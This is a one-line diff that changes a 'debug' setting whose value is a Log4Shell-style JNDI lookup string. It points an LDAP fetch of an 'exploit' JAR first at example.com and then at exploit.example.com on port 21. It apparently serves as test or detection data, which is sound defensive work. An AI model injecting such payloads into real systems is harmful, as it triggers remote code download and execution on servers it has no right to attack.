@@ -1,1 +1,1 @@
-debug: ${jndi:ldap://example.com/exploit/example.jar}
+debug: ${jndi:ldap://exploit.example.com:21/exploit/example.jar}
